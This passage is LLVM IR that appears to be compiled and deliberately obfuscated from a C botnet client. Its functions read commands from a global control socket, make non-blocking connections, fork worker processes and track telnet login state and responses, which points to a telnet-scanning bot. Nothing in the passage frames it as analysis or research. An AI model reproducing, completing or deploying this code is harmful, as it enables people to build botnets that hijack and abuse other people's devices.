  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #5

declare i64 @send(i32, i8*, i64, i32) #2

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = sub i64 %7, 1476962777195847606
  %9 = sub i64 %8, 1
  %10 = add i64 %9, 1476962777195847606
  %11 = sub i64 %7, 1
  %12 = trunc i64 %10 to i32
  store i32 %12, i32* %5, align 4
  br label %13

; <label>:13:                                     ; preds = %31, %1
  %14 = call i16** @__ctype_b_loc() #10
  %15 = load i16*, i16** %14, align 8
  %16 = load i8*, i8** %2, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i8, i8* %19, align 1
  %21 = sext i8 %20 to i32
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds i16, i16* %15, i64 %22
  %24 = load i16, i16* %23, align 2
  %25 = zext i16 %24 to i32
  %26 = xor i32 8192, -1
  %27 = xor i32 %25, %26
  %28 = and i32 %27, %25
  %29 = and i32 %25, 8192
  %30 = icmp ne i32 %28, 0
  br i1 %30, label %31, label %36

; <label>:31:                                     ; preds = %13
  %32 = load i32, i32* %4, align 4
  %33 = sub i32 0, 1
  %34 = sub i32 %32, %33
  %35 = add nsw i32 %32, 1
  store i32 %34, i32* %4, align 4
  br label %13

; <label>:36:                                     ; preds = %13
  br label %37

; <label>:37:                                     ; preds = %65, %36
  %38 = load i32, i32* %5, align 4
  %39 = load i32, i32* %4, align 4
  %40 = icmp sge i32 %38, %39
  br i1 %40, label %41, label %63

; <label>:41:                                     ; preds = %37
  %42 = call i16** @__ctype_b_loc() #10
  %43 = load i16*, i16** %42, align 8
  %44 = load i8*, i8** %2, align 8
  %45 = load i32, i32* %5, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds i8, i8* %44, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i16, i16* %43, i64 %50
  %52 = load i16, i16* %51, align 2
  %53 = zext i16 %52 to i32
  %54 = xor i32 %53, -1
  %55 = xor i32 8192, -1
  %56 = xor i32 736757382, -1
  %57 = or i32 %54, %55
  %58 = or i32 736757382, %56
  %59 = xor i32 %57, -1
  %60 = and i32 %59, %58
  %61 = and i32 %53, 8192
  %62 = icmp ne i32 %60, 0
  br label %63

; <label>:63:                                     ; preds = %41, %37
  %64 = phi i1 [ false, %37 ], [ %62, %41 ]
  br i1 %64, label %65, label %72

; <label>:65:                                     ; preds = %63
  %66 = load i32, i32* %5, align 4
  %67 = sub i32 0, %66
  %68 = sub i32 0, -1
  %69 = add i32 %67, %68
  %70 = sub i32 0, %69
  %71 = add nsw i32 %66, -1
  store i32 %70, i32* %5, align 4
  br label %37

; <label>:72:                                     ; preds = %63
  %73 = load i32, i32* %4, align 4
  store i32 %73, i32* %3, align 4
  br label %74

; <label>:74:                                     ; preds = %93, %72
  %75 = load i32, i32* %3, align 4
  %76 = load i32, i32* %5, align 4
  %77 = icmp sle i32 %75, %76
  br i1 %77, label %78, label %98

; <label>:78:                                     ; preds = %74
  %79 = load i8*, i8** %2, align 8
  %80 = load i32, i32* %3, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8, i8* %79, i64 %81
  %83 = load i8, i8* %82, align 1
  %84 = load i8*, i8** %2, align 8
  %85 = load i32, i32* %3, align 4
  %86 = load i32, i32* %4, align 4
  %87 = sub i32 %85, 489797866
  %88 = sub i32 %87, %86
  %89 = add i32 %88, 489797866
  %90 = sub nsw i32 %85, %86
  %91 = sext i32 %89 to i64
  %92 = getelementptr inbounds i8, i8* %84, i64 %91
  store i8 %83, i8* %92, align 1
  br label %93

; <label>:93:                                     ; preds = %78
  %94 = load i32, i32* %3, align 4
  %95 = sub i32 0, 1
  %96 = sub i32 %94, %95
  %97 = add nsw i32 %94, 1
  store i32 %96, i32* %3, align 4
  br label %74

; <label>:98:                                     ; preds = %74
  %99 = load i8*, i8** %2, align 8
  %100 = load i32, i32* %3, align 4
  %101 = load i32, i32* %4, align 4
  %102 = sub i32 0, %101
  %103 = add i32 %100, %102
  %104 = sub nsw i32 %100, %101
  %105 = sext i32 %103 to i64
  %106 = getelementptr inbounds i8, i8* %99, i64 %105
  store i8 0, i8* %106, align 1
  ret void
}

; Function Attrs: nounwind readnone
declare i16** @__ctype_b_loc() #6

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #3
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #3, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = and i64 %43, %37
  %45 = xor i64 %43, %37
  %46 = or i64 %44, %45
  %47 = or i64 %43, %37
  store i64 %46, i64* %42, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sub i32 0, %48
  %50 = sub i32 0, 1
  %51 = add i32 %49, %50
  %52 = sub i32 0, %51
  %53 = add nsw i32 %48, 1
  %54 = call i32 @select(i32 %52, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %54, i32* %12, align 4
  %55 = icmp sle i32 %54, 0
  br i1 %55, label %56, label %103

; <label>:56:                                     ; preds = %33
  br label %57

; <label>:57:                                     ; preds = %95, %56
  %58 = load i32, i32* %13, align 4
  %59 = icmp slt i32 %58, 10
  br i1 %59, label %60, label %102

; <label>:60:                                     ; preds = %57
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %61, align 8
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %62, align 8
  br label %63

; <label>:63:                                     ; preds = %60
  %64 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %65 = getelementptr inbounds [16 x i64], [16 x i64]* %64, i64 0, i64 0
  %66 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %65) #3, !srcloc !2
  %67 = extractvalue { i64, i64* } %66, 0
  %68 = extractvalue { i64, i64* } %66, 1
  %69 = trunc i64 %67 to i32
  store i32 %69, i32* %14, align 4
  %70 = ptrtoint i64* %68 to i64
  %71 = trunc i64 %70 to i32
  store i32 %71, i32* %15, align 4
  br label %72

; <label>:72:                                     ; preds = %63
  %73 = load i32, i32* %5, align 4
  %74 = srem i32 %73, 64
  %75 = zext i32 %74 to i64
  %76 = shl i64 1, %75
  %77 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %78 = load i32, i32* %5, align 4
  %79 = sdiv i32 %78, 64
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds [16 x i64], [16 x i64]* %77, i64 0, i64 %80
  %82 = load i64, i64* %81, align 8
  %83 = and i64 %82, %76
  %84 = xor i64 %82, %76
  %85 = or i64 %83, %84
  %86 = or i64 %82, %76
  store i64 %85, i64* %81, align 8
  %87 = load i32, i32* %5, align 4
  %88 = sub i32 0, %87
  %89 = sub i32 0, 1
  %90 = add i32 %88, %89
  %91 = sub i32 0, %90
  %92 = add nsw i32 %87, 1
  %93 = call i32 @select(i32 %91, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %93, i32* %12, align 4
  %94 = icmp sle i32 %93, 0
  br i1 %94, label %95, label %101

; <label>:95:                                     ; preds = %72
  %96 = load i32, i32* %13, align 4
  %97 = sub i32 %96, -111548163
  %98 = add i32 %97, 1
  %99 = add i32 %98, -111548163
  %100 = add nsw i32 %96, 1
  store i32 %99, i32* %13, align 4
  br label %57

; <label>:101:                                    ; preds = %72
  br label %102

; <label>:102:                                    ; preds = %101, %57
  br label %103

; <label>:103:                                    ; preds = %102, %33
  store i32 0, i32* %18, align 4
  %104 = load i8*, i8** %6, align 8
  store i8* %104, i8** %17, align 8
  br label %105

; <label>:105:                                    ; preds = %126, %103
  %106 = load i32, i32* %7, align 4
  %107 = sub i32 %106, 601769557
  %108 = add i32 %107, -1
  %109 = add i32 %108, 601769557
  %110 = add nsw i32 %106, -1
  store i32 %109, i32* %7, align 4
  %111 = icmp sgt i32 %106, 1
  br i1 %111, label %112, label %132

; <label>:112:                                    ; preds = %105
  %113 = load i32, i32* @KadenCommStock, align 4
  %114 = call i64 @recv(i32 %113, i8* %16, i64 1, i32 0)
  %115 = icmp ne i64 %114, 1
  br i1 %115, label %116, label %118

; <label>:116:                                    ; preds = %112
  %117 = load i8*, i8** %17, align 8
  store i8 0, i8* %117, align 1
  store i32 -1, i32* %4, align 4
  br label %135

; <label>:118:                                    ; preds = %112
  %119 = load i8, i8* %16, align 1
  %120 = load i8*, i8** %17, align 8
  %121 = getelementptr inbounds i8, i8* %120, i32 1
  store i8* %121, i8** %17, align 8
  store i8 %119, i8* %120, align 1
  %122 = load i8, i8* %16, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp eq i32 %123, 10
  br i1 %124, label %125, label %126

; <label>:125:                                    ; preds = %118
  br label %132

; <label>:126:                                    ; preds = %118
  %127 = load i32, i32* %18, align 4
  %128 = add i32 %127, 1164978724
  %129 = add i32 %128, 1
  %130 = sub i32 %129, 1164978724
  %131 = add nsw i32 %127, 1
  store i32 %130, i32* %18, align 4
  br label %105

; <label>:132:                                    ; preds = %125, %105
  %133 = load i8*, i8** %17, align 8
  store i8 0, i8* %133, align 1
  %134 = load i32, i32* %18, align 4
  store i32 %134, i32* %4, align 4
  br label %135

; <label>:135:                                    ; preds = %132, %116
  %136 = load i32, i32* %4, align 4
  ret i32 %136
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #2

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = xor i64 %22, -1
  %24 = xor i64 2048, -1
  %25 = xor i64 -8422234339673399804, -1
  %26 = and i64 %23, -8422234339673399804
  %27 = and i64 %22, %25
  %28 = and i64 %24, -8422234339673399804
  %29 = and i64 2048, %25
  %30 = or i64 %26, %27
  %31 = or i64 %28, %29
  %32 = xor i64 %30, %31
  %33 = or i64 %23, %24
  %34 = xor i64 %33, -1
  %35 = or i64 -8422234339673399804, %25
  %36 = and i64 %34, %35
  %37 = or i64 %32, %36
  %38 = or i64 %22, 2048
  store i64 %37, i64* %15, align 8
  %39 = load i32, i32* %6, align 4
  %40 = load i64, i64* %15, align 8
  %41 = call i32 (i32, i32, ...) @fcntl(i32 %39, i32 4, i64 %40)
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %42, align 4
  %43 = load i32, i32* %8, align 4
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @htons(i16 zeroext %44) #10
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  %47 = load i8*, i8** %7, align 8
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %49 = call i32 @getHost(i8* %47, %struct.in_addr* %48)
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %136

; <label>:52:                                     ; preds = %4
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %54 = getelementptr inbounds [8 x i8], [8 x i8]* %53, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 8, i32 4, i1 false)
  %55 = load i32, i32* %6, align 4
  %56 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %57 = call i32 @connect(i32 %55, %struct.sockaddr* %56, i32 16)
  store i32 %57, i32* %16, align 4
  %58 = load i32, i32* %16, align 4
  %59 = icmp slt i32 %58, 0
  br i1 %59, label %60, label %124

; <label>:60:                                     ; preds = %52
  %61 = call i32* @__errno_location() #10
  %62 = load i32, i32* %61, align 4
  %63 = icmp eq i32 %62, 115
  br i1 %63, label %64, label %122

; <label>:64:                                     ; preds = %60
  %65 = load i32, i32* %9, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %66, i64* %67, align 8
  %68 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %68, align 8
  br label %69

; <label>:69:                                     ; preds = %64
  %70 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %71 = getelementptr inbounds [16 x i64], [16 x i64]* %70, i64 0, i64 0
  %72 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %71) #3, !srcloc !3
  %73 = extractvalue { i64, i64* } %72, 0
  %74 = extractvalue { i64, i64* } %72, 1
  %75 = trunc i64 %73 to i32
  store i32 %75, i32* %17, align 4
  %76 = ptrtoint i64* %74 to i64
  %77 = trunc i64 %76 to i32
  store i32 %77, i32* %18, align 4
  br label %78

; <label>:78:                                     ; preds = %69
  %79 = load i32, i32* %6, align 4
  %80 = srem i32 %79, 64
  %81 = zext i32 %80 to i64
  %82 = shl i64 1, %81
  %83 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %84 = load i32, i32* %6, align 4
  %85 = sdiv i32 %84, 64
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds [16 x i64], [16 x i64]* %83, i64 0, i64 %86
  %88 = load i64, i64* %87, align 8
  %89 = xor i64 %88, -1
  %90 = xor i64 %82, -1
  %91 = xor i64 2640818585455110040, -1
  %92 = and i64 %89, 2640818585455110040
  %93 = and i64 %88, %91
  %94 = and i64 %90, 2640818585455110040
  %95 = and i64 %82, %91
  %96 = or i64 %92, %93
  %97 = or i64 %94, %95
  %98 = xor i64 %96, %97
  %99 = or i64 %89, %90
  %100 = xor i64 %99, -1
  %101 = or i64 2640818585455110040, %91
  %102 = and i64 %100, %101
  %103 = or i64 %98, %102
  %104 = or i64 %88, %82
  store i64 %103, i64* %87, align 8
  %105 = load i32, i32* %6, align 4
  %106 = add i32 %105, 1776258095
  %107 = add i32 %106, 1
  %108 = sub i32 %107, 1776258095
  %109 = add nsw i32 %105, 1
  %110 = call i32 @select(i32 %108, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %111 = icmp sgt i32 %110, 0
  br i1 %111, label %112, label %120

; <label>:112:                                    ; preds = %78
  store i32 4, i32* %13, align 4
  %113 = load i32, i32* %6, align 4
  %114 = bitcast i32* %14 to i8*
  %115 = call i32 @getsockopt(i32 %113, i32 1, i32 4, i8* %114, i32* %13) #3
  %116 = load i32, i32* %14, align 4
  %117 = icmp ne i32 %116, 0
  br i1 %117, label %118, label %119

; <label>:118:                                    ; preds = %112
  store i32 0, i32* %5, align 4
  br label %136

; <label>:119:                                    ; preds = %112
  br label %121

; <label>:120:                                    ; preds = %78
  store i32 0, i32* %5, align 4
  br label %136

; <label>:121:                                    ; preds = %119
  br label %123

; <label>:122:                                    ; preds = %60
  store i32 0, i32* %5, align 4
  br label %136

; <label>:123:                                    ; preds = %121
  br label %124

; <label>:124:                                    ; preds = %123, %52
  %125 = load i32, i32* %6, align 4
  %126 = call i32 (i32, i32, ...) @fcntl(i32 %125, i32 3, i8* null)
  %127 = sext i32 %126 to i64
  store i64 %127, i64* %15, align 8
  %128 = load i64, i64* %15, align 8
  %129 = xor i64 -2049, -1
  %130 = xor i64 %128, %129
  %131 = and i64 %130, %128
  %132 = and i64 %128, -2049
  store i64 %131, i64* %15, align 8
  %133 = load i32, i32* %6, align 4
  %134 = load i64, i64* %15, align 8
  %135 = call i32 (i32, i32, ...) @fcntl(i32 %133, i32 4, i64 %134)
  store i32 1, i32* %5, align 4
  br label %136

; <label>:136:                                    ; preds = %124, %122, %120, %118, %51
  %137 = load i32, i32* %5, align 4
  ret i32 %137
}

declare i32 @fcntl(i32, i32, ...) #2

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #3
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %61

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = sub i64 0, %11
  %13 = sub i64 0, 1
  %14 = add i64 %12, %13
  %15 = sub i64 0, %14
  %16 = add i64 %11, 1
  store i64 %15, i64* @numpids, align 8
  %17 = load i64, i64* @numpids, align 8
  %18 = sub i64 0, 1
  %19 = sub i64 %17, %18
  %20 = add i64 %17, 1
  %21 = mul i64 %19, 4
  %22 = call noalias i8* @malloc(i64 %21) #3
  %23 = bitcast i8* %22 to i32*
  store i32* %23, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %24

; <label>:24:                                     ; preds = %43, %10
  %25 = load i32, i32* %4, align 4
  %26 = zext i32 %25 to i64
  %27 = load i64, i64* @numpids, align 8
  %28 = add i64 %27, -2617853925311102246
  %29 = sub i64 %28, 1
  %30 = sub i64 %29, -2617853925311102246
  %31 = sub i64 %27, 1
  %32 = icmp ult i64 %26, %30
  br i1 %32, label %33, label %48

; <label>:33:                                     ; preds = %24
  %34 = load i32*, i32** @pids, align 8
  %35 = load i32, i32* %4, align 4
  %36 = zext i32 %35 to i64
  %37 = getelementptr inbounds i32, i32* %34, i64 %36
  %38 = load i32, i32* %37, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i32, i32* %4, align 4
  %41 = zext i32 %40 to i64
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  br label %43

; <label>:43:                                     ; preds = %33
  %44 = load i32, i32* %4, align 4
  %45 = sub i32 0, 1
  %46 = sub i32 %44, %45
  %47 = add i32 %44, 1
  store i32 %46, i32* %4, align 4
  br label %24

; <label>:48:                                     ; preds = %24
  %49 = load i32, i32* %2, align 4
  %50 = load i32*, i32** %3, align 8
  %51 = load i64, i64* @numpids, align 8
  %52 = add i64 %51, -5185903597275405621
  %53 = sub i64 %52, 1
  %54 = sub i64 %53, -5185903597275405621
  %55 = sub i64 %51, 1
  %56 = getelementptr inbounds i32, i32* %50, i64 %54
  store i32 %49, i32* %56, align 4
  %57 = load i32*, i32** @pids, align 8
  %58 = bitcast i32* %57 to i8*
  call void @free(i8* %58) #3
  %59 = load i32*, i32** %3, align 8
  store i32* %59, i32** @pids, align 8
  %60 = load i32, i32* %2, align 4
  store i32 %60, i32* %1, align 4
  br label %61

; <label>:61:                                     ; preds = %48, %8
  %62 = load i32, i32* %1, align 4
  ret i32 %62
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #3
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* %32, i8** %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %31
  store i32 1, i32* %6, align 4
  br label %38

; <label>:37:                                     ; preds = %31
  store i32 0, i32* %6, align 4
  br label %38

; <label>:38:                                     ; preds = %37, %36
  %39 = load i32, i32* %6, align 4
  ret i32 %39
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.fd_set, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

; <label>:18:                                     ; preds = %4
  %19 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #3, !srcloc !4
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  br label %27

; <label>:27:                                     ; preds = %18
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = xor i64 %37, -1
  %39 = xor i64 %31, -1
  %40 = xor i64 -6880424943594347271, -1
  %41 = and i64 %38, -6880424943594347271
  %42 = and i64 %37, %40
  %43 = and i64 %39, -6880424943594347271
  %44 = and i64 %31, %40
  %45 = or i64 %41, %42
  %46 = or i64 %43, %44
  %47 = xor i64 %45, %46
  %48 = or i64 %38, %39
  %49 = xor i64 %48, -1
  %50 = or i64 -6880424943594347271, %40
  %51 = and i64 %49, %50
  %52 = or i64 %47, %51
  %53 = or i64 %37, %31
  store i64 %52, i64* %36, align 8
  %54 = load i32, i32* %6, align 4
  %55 = sub i32 0, 1
  %56 = sub i32 %54, %55
  %57 = add nsw i32 %54, 1
  %58 = call i32 @select(i32 %56, %struct.fd_set* %10, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %11)
  %59 = icmp slt i32 %58, 1
